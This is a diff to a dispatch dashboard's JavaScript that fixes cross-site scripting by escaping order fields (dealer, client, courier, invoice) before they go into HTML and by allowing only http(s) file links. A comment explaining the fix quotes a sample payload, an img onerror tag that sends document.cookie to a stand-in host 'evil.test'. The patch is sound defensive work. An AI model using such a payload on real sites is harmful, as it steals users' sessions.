@@ -409,32 +409,32 @@ function dsp_renderTable(data) {
     if(s.toLowerCase().includes('dispatched')) b='info';
     if(s.toLowerCase().includes('delivered')) b='success';
     return `<tr>
-      <td><input type="checkbox" class="dsp_checkbox" value="${o.ID}" data-row="${i}" ${dsp_selected.has(o.ID.toString()) ? 'checked' : ''} onclick="dsp_handleCheck(event, '${o.ID}', ${i})"></td>
+      <td><input type="checkbox" class="dsp_checkbox" value="${dspEsc(o.ID)}" data-row="${i}" ${dsp_selected.has(o.ID.toString()) ? 'checked' : ''} onclick="dsp_handleCheck(event, '${dspEsc(o.ID)}', ${i})"></td>
       <td>${i + 1}</td>
-      <td class="fw-bold">${o.Display_ID || o.ID}${dsp_repeatNote(o)}</td>
-      <td class="text-nowrap">${o.Ready_Date||'-'}</td>
-      <td class="text-nowrap">${o.Dispatch_Date||'-'}</td>
-      <td>${o.Dealer_name||''}</td>
-      <td>${o.Client_name||''}</td>
-      <td>${o.Dispatch_Courier_Name||'-'}</td>
-      <td>${o.Docket_No||'-'}</td>
-      <td>${o.Invoice_Number||'-'}</td>
-      <td>${o.Invoice_Amount||'-'}</td>
-      <td>${o.Number_of_Boxes||'-'}</td>
-      <td>${o.Weight||'-'}</td>
-      <td>${o.Volumetric_Weight||'-'}</td>
-      <td class="fw-bold">${o.Display_ID || o.ID}</td>
-      <td><span class="badge bg-${b}">${s}</span></td>
+      <td class="fw-bold">${dspEsc(o.Display_ID || o.ID)}${dsp_repeatNote(o)}</td>
+      <td class="text-nowrap">${dspEsc(o.Ready_Date||'-')}</td>
+      <td class="text-nowrap">${dspEsc(o.Dispatch_Date||'-')}</td>
+      <td>${dspEsc(o.Dealer_name||'')}</td>
+      <td>${dspEsc(o.Client_name||'')}</td>
+      <td>${dspEsc(o.Dispatch_Courier_Name||'-')}</td>
+      <td>${dspEsc(o.Docket_No||'-')}</td>
+      <td>${dspEsc(o.Invoice_Number||'-')}</td>
+      <td>${dspEsc(o.Invoice_Amount||'-')}</td>
+      <td>${dspEsc(o.Number_of_Boxes||'-')}</td>
+      <td>${dspEsc(o.Weight||'-')}</td>
+      <td>${dspEsc(o.Volumetric_Weight||'-')}</td>
+      <td class="fw-bold">${dspEsc(o.Display_ID || o.ID)}</td>
+      <td><span class="badge bg-${b}">${dspEsc(s)}</span></td>
       <!-- Whether the client has been told. Blank when nothing has gone,
            because an empty cell is what somebody is scanning the column
            for; the date it went is on the badge for the one row they
            then stop at. -->
       <td class="text-nowrap">${o.Mail_Sent
-        ? `<span class="badge bg-success" title="Sent ${o.Mail_Sent}">Email sent</span>`
+        ? `<span class="badge bg-success" title="Sent ${dspEsc(o.Mail_Sent)}">Email sent</span>`
         : ''}</td>
       <td>
-        <button class="btn btn-sm btn-info me-1" onclick="dsp_openView('${o.ID}')"><i class="fas fa-eye"></i></button>
-        <button class="btn btn-sm btn-primary" onclick="dsp_openEdit('${o.ID}')"><i class="fas fa-shipping-fast"></i></button>
+        <button class="btn btn-sm btn-info me-1" onclick="dsp_openView('${dspEsc(o.ID)}')"><i class="fas fa-eye"></i></button>
+        <button class="btn btn-sm btn-primary" onclick="dsp_openEdit('${dspEsc(o.ID)}')"><i class="fas fa-shipping-fast"></i></button>
       </td>
     </tr>`;
   }).join('');
@@ -450,6 +450,23 @@ function dsp_renderTable(data) {
  * The earlier run is pinned to Backup Dispatch the moment a repeat is opened,
  * so in practice these two lines are on different boards.
  */
+// ── EVERY VALUE THAT GOES INTO HTML COMES THROUGH HERE ──
+//
+// This board prints the dealer, the client, the courier, the docket and
+// the invoice number straight into a row of HTML. All five are typed by a
+// person on another screen, so a name like
+//     <img src=x onerror="fetch('https://evil.test?c='+document.cookie)">
+// saved once on the order form is script that runs in the dispatch
+// manager's browser every time this board is opened - with their session.
+//
+// & first, or the other four replacements would be re-encoded. The
+// apostrophe is included because this file has attributes quoted with it.
+function dspEsc(v) {
+  return String(v === null || v === undefined ? '' : v)
+    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
+    .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
+}
+
 function dsp_repeatNote(o) {
   const lines = [];
   if(o.Remake_Of) lines.push('repeat run');
@@ -480,10 +497,22 @@ async function dsp_openView(orderId) {
     let val = rowData[key]; if(!val||val.toString().trim()==='') continue;
     let isLink = false;
     if((linkKeys.includes(key)||key.toLowerCase().includes('upload'))&&val.toString().includes('http')) {
-      val = val.toString().split(/[\n,]+/).map(l=>l.trim().startsWith('http')?`<a href="${l.trim()}" target="_blank" class="btn btn-sm btn-outline-primary m-1"><i class="fas fa-external-link-alt me-1"></i>View File</a>`:'').join(''); isLink=true;
+      // Only http(s) ever becomes a link - a `javascript:` address saved in
+      // one of these fields would otherwise be a button that runs it - and
+      // the address is escaped because a quote in it would otherwise close
+      // the attribute and start writing HTML of its own.
+      val = val.toString().split(/[\n,]+/).map(l => {
+        const href = l.trim();
+        return /^https?:\/\//i.test(href)
+          ? `<a href="${dspEsc(href)}" target="_blank" rel="noopener" class="btn btn-sm btn-outline-primary m-1"><i class="fas fa-external-link-alt me-1"></i>View File</a>`
+          : '';
+      }).join(''); isLink=true;
     }
     const col = key.toLowerCase().includes('remark')||key.length>50?'col-12':'col-md-6';
-    html += `<div class="${col} view-item"><span class="view-label">${key}</span><div class="${isLink?'':'view-value'}">${val}</div></div>`;
+    // THIS BOX PRINTS EVERY FIELD OF THE ORDER - remarks, client name, the
+    // lot - so it is the widest opening on the board. The link case above
+    // has already built its own safe HTML; everything else is text.
+    html += `<div class="${col} view-item"><span class="view-label">${dspEsc(key)}</span><div class="${isLink?'':'view-value'}">${isLink ? val : dspEsc(val)}</div></div>`;
   }
   body.innerHTML = html+'</div>';
 }
@@ -638,7 +667,7 @@ async function dsp_revertToProduction() {
   const confirmed = await Swal.fire({
     title: 'Send back to Production?',
     html: `Order <b>${id}</b> will leave the Dispatch Dashboard and return to the <b>Production queue</b>.`
-      + (hasDate ? `<br><br>Its dispatch date (<b>${o.Dispatch_Date}</b>) will be cleared.` : '')
+      + (hasDate ? `<br><br>Its dispatch date (<b>${dspEsc(o.Dispatch_Date)}</b>) will be cleared.` : '')
       + `<br><br><span class="text-muted small">Courier, docket and invoice details are kept.</span>`,
     icon: 'warning',
     showCancelButton: true,
